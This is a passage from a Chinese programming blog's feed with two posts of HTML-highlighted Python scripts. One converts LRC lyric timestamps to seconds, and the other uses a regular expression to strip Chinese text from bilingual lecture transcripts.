&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;decimal&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Decimal&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;filter_filetype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;filetype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;filenames&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;))]&lt;/span&gt; &lt;span class="c1"&gt;#Get all regular files&lt;/span&gt;
    &lt;span class="n"&gt;filter_filename_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;filenames&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;endswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;filter_filename_list&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;min_sec_str2sec_str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;min_sec_str&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;minute:second change to second&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;min_sec_str&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sec&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sec_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;sec_str&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;format_file_time&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;input_file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;input_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;thetime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;r&amp;quot;\[(\d{2}:.{5})\]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;#match is list: [&amp;#39;00:00.12&amp;#39;,...]&lt;/span&gt;
        &lt;span class="n"&gt;match&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;thetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;sec_strs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;min_sec_str2sec_str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;min_sec_str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;min_sec_str&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;match&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="c1"&gt;#再一次推导，使其成为新的格式，注意边界&lt;/span&gt;
        &lt;span class="n"&gt;new_format&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;{:&amp;lt;6s}  {:&amp;gt;6s}   &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sec_str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;sec_strs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;sec_str&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sec_strs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sec_strs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;#最后一行是边界&lt;/span&gt;
        &lt;span class="c1"&gt;#单独添加最后一行&lt;/span&gt;
        &lt;span class="c1"&gt;#new_format.append(sec_strs[-1])#list本身被改变了&lt;/span&gt;
        &lt;span class="c1"&gt;#print new_format&lt;/span&gt;
        &lt;span class="c1"&gt;#exit()&lt;/span&gt;
    &lt;span class="n"&gt;filename_split&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#后缀改为txt&lt;/span&gt;
    &lt;span class="n"&gt;out_filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filename_split&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_output.txt&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;output_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;out_filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;input_file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;#行号标记&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;input_file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sec_strs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="c1"&gt;#最后一行不要&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;
            &lt;span class="n"&gt;result_line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;thetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_format&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="c1"&gt;#print result_line&lt;/span&gt;
            &lt;span class="n"&gt;output_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result_line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="n"&gt;output_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;filetype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;filter_filename_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filter_filetype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;filter_filename_list&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;format_file_time&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="c1"&gt;#注意路径&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用：&lt;code&gt;python3 two_line_time.py PATH lrc&lt;/code&gt; （PATH是你要处理的lrc文件的路径，请使用绝对路径!）&lt;/p&gt;
&lt;p&gt;室友说这段代码可能会挺有用，目前网上下载到的多是这类lrc，需要这样转化后才能被软件读取。&lt;/p&gt;
&lt;p&gt;在OS X 和ubuntu下测试都正常&lt;/p&gt;
&lt;p&gt;用得着的同学就自取吧~&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 22 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-22:regex-demo2.html</guid><category>regex</category></item><item><title>正则表达式一例</title><link>/regex-demo.html</link><description>&lt;p&gt;前些日子读《精通正则表达式》读的起劲，每天早起读个把小时，兴趣盎然。&lt;/p&gt;
&lt;p&gt;正愁没实战场景，只每天在Vim里用用，颇为寂寞。&lt;/p&gt;
&lt;p&gt;前几天室友要处理一批类歌词文件（英文朗读？），需要清理其中的部分内容，手动操作很是繁琐，让我试着用代码帮着处理下。啊，这不正是使用正则的绝佳场所么&lt;/p&gt;
&lt;h1&gt;待处理文本&lt;/h1&gt;
&lt;p&gt;文本是这样的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;TPO_2102_L01

0   2.16    Listen to part of lecture in the history of science class.
2.16    11.2    OK, we&amp;#39;ve been talking about how throughout the history.        好的,我们已经讨论过历史的发展.
11.2    14.8    It was often difficult for people to give up ideas which have long been taken for granted as scientific truths, even if those ideas were false.     人们放弃一种已经被认定是科学的事实的念头非常困难,即使那个念头是不对的.
14.8    24.32   In astronomy, for example, the distinction between the solar system and the universe wasn&amp;#39;t clear until modern times.       拿天文学来举个例子,人们直到近代才将太阳系和宇宙的概念弄清楚. (第一题what&amp;#39;s the purpose of the lecture?)
24.32   32.04   The ancient Greeks believed that what we called the solar system was in fact the entire universe, and that the universe was geocentric.     古希腊认为宇宙就是我们现在所说的太阳系,而整个宇宙中,地球就是宇宙的中心.
32.04   43.0    Geocentric means Earth-centric, so the geocentric view holds that the Sun, the planets, and the stars, all revolve around the Earth which is stationary.
43.0    54.72   Of course, we now know that the planets including Earth revolve around the Sun, and that solar system is only a tiny part of the universe.      当然了,我们现在是知道所有的星球都围绕着太阳转,地球也是星球,而且太阳系只是宇宙的一小部分.

......
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;需求&lt;/h1&gt;
&lt;p&gt;某路径下有若干txt文件,清理掉文件中的中文，夹杂在中文中数字/英文/标点也一并清除&lt;/p&gt;
&lt;h1&gt;正则的视角&lt;/h1&gt;
&lt;p&gt;在正则的视角下的解决方案，大约是这样的，对于每个文件，从每一行的第一个中文字符，一直清除到行尾 （以行为基本单位）&lt;/p&gt;
&lt;h1&gt;解决方案（Python版）&lt;/h1&gt;
&lt;p&gt;直接上代码啦，当当当当&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;filter_filetype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;filetype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;filenames&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;))]&lt;/span&gt; &lt;span class="c1"&gt;#Get all regular files&lt;/span&gt;
    &lt;span class="n"&gt;filter_filename_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;filenames&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;endswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;filter_filename_list&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;clean_zh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;zh_to_endline&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;r&amp;quot;[\u4e00-\u9fa5].*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MULTILINE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#匹配从中文开始到行尾,多行模式&lt;/span&gt;
    &lt;span class="n"&gt;filename_split&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;output_filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;filename_split&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_output.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;filename_split&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;output_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output_filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;input_file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;clean_content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;zh_to_endline&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;input_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
            &lt;span class="c1"&gt;#clean_line = zh_to_endline.sub(&amp;quot;&amp;quot;,line) #返回替换完的行，如果没有替换则原文返回&lt;/span&gt;
            &lt;span class="n"&gt;output_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;clean_content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="c1"&gt;#input_file.seek(0) #移到文件头，覆盖掉&lt;/span&gt;
            &lt;span class="c1"&gt;#input_file.write(clean_content)&lt;/span&gt;
    &lt;span class="n"&gt;output_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;#传递命令行参数 path&lt;/span&gt;
